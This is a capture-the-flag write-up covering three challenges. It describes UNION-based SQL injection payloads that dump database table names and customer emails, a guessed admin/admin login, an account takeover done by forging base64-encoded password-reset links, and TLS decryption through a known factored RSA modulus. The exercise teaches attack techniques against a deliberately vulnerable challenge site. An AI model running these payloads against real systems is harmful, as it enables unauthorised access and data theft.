# Web

## Stockos

Our first goal, given by Jérémy Nitel, was to search for creditentials in a broken warehouse's website named Stockos. The messages also indicates that Stockos has its admin password leaked multiple times and that it was a simple one.

When landing on the provided link (https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1/), we stumble upon a login page. Remembering the easy password, we tried `admin` as login and password. Bingo! It was right, we are now logged on as the admin. We cannot do much except change some personal infos about the admin and list the orders from the warehouse. Interestingly, there is a search function, this got us and idea to try for an SQL injection.

And so we did, by trying different character sets, we found out that `' AND 1=1 -- '` works. We then supposed that the request was written like this:
```sql
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='<our input text>%' ORDER BY section ASC
-- With our input text:
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 1=1 -- '%' ORDER BY section ASC;
```
Now, with a door to enter, we can use the keyword `UNION` to append new information on the tables. One very interesting table name to look for is `information_schema.tables`. This is a table that lists all tables.
```sql
-- <' AND 0=1 UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables -- '%' ORDER BY section ASC
```
With every tables listed, we can check the `customer` table. We still need the column names and the table `information_schema.columns` can help us.
```sql
-- <' AND 0=1 UNION SELECT column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_name='customer' -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_name='customer' -- '%' ORDER BY section ASC
```
The request above will print the name of every column of `customer`. `name` and `email` are very useful.
```sql
-- <' AND 0=1 UNION SELECT name, email, 3, 4, 5 FROM customer -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT name, email, 3, 4, 5 FROM customer -- '%' ORDER BY section ASC
```
This last SQL request will print the list of each customer's name and email. And there lays the email we are looking for: `agent.malice@secret.evil.gov.ev`. We can now go try the rest of the challenge.

*__Note__: The end of the SQL request can be leaked by creating a malformed request like `'`. You can also find that this is a MySQL server. The numbers `1` to `5` in SQL requests are special name for dummy columns.*

## Evil Air

This plane ticket bookmarking website were also given by Mr. Nitel (https://www.challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/). We had to book a plane ticket from `Bad City` to `Evil City` at thoses dates `26/10/2020` -> ` 28/10/2020` (French Date Format).

When we tried to book the ticket, it asked us to login / register on the site. If you register with a standard mail / username email, you will be denied from accessing the order page, and accessing the QR Code that contain the flag to going further.

You the get an activation link: `http://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/activate/ZXhhbXBsZS5leGFtcGxlQHRlc3QuY29t

Then we looked at the reset password form, and the link were the same with the sole variation: instead of `activate` you have `reset`. We digged more the link and discovered that the last part of the link was a base64 hash of the account email address (this link is the hash of `example.example@test.com`). We replaced the fake account with the base64 hash of the email we were looking for on stockos (http://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==), then it displayed the password, and allowed us to order the ticket. It then shows the QR code containing the flag `DGSESIEE{2cd992f9b2319860ce3a35db6673a9b8}`.

<p align="center">
    <img width=25% src="./flag.png" alt="Rank: 153 - Team: Sagliss - Last Validation: 08/11 - Points: 450">
</p>

When provinding the flag, Nitel responded with a `.pcap` file.

## TLS

The next challenge is about decypting a conversation between a client and a server. The data is stored in [capture.pcap](./capture.pcap). One can see that the conversation is done via TLS. The issue is that TLS data can be encrypted (and it is the case here). The conversation is done via `TLS_RSA_WITH_AES_128_CBC_SHA` which is crackable if someone can crack the RSA key of the server. The `PublicKey` is available under the `Certificate` exchange and one can found the following number for `n`:
```
(hex) 0x00c2cbb24fdbf923b61268e3f11a3896de4574b3ba58730cbd652938864e2223eeeb704a17cfd08d16b46891a61474759939c6e49aafe7f2595548c74c1d7fb8d24cd15cb23b4cd0a3
(dec) 188198812920607963838697239461650439807163563379417382700763356422988859715234665485319060606504743045317388011303396716199692321205734031879550656996221305168759307650257059
```
While browsing for solutions, we found that this peculiar number was a factorisation challenge called [RSA-576](https://en.wikipedia.org/wiki/RSA_numbers#RSA-576) that yields these results:
```
188198812920607963838697239461650439807163563379417382700763356422988859715234665485319060606504743045317388011303396716199692321205734031879550656996221305168759307650257059
=
398075086424064937397125500550386491199064362342526708406385189575946388957261768583317
x
472772146107435302536223071973048224632914695302097116459852171130520711256363590397527
```
The python script [rsa_gen.py](./rsa_gen.py) (Requires [rsa](https://pypi.org/project/rsa/)) will generate a private key file that will be used by Wireshark to decrypt the [TLS](https://wiki.wireshark.org/TLS?action=show&redirect=SSL).
```
$ python rsa_gen.py private.pem
```
When decrypting the TLS with this private key, we can find that the user was accessing the page `/7a144cdc500b28e80cf760d60aca2ed3` but resulted in a 404. And this is the link to the Coros CTF (https://ctf.challengecybersec.fr/7a144cdc500b28e80cf760d60aca2ed3)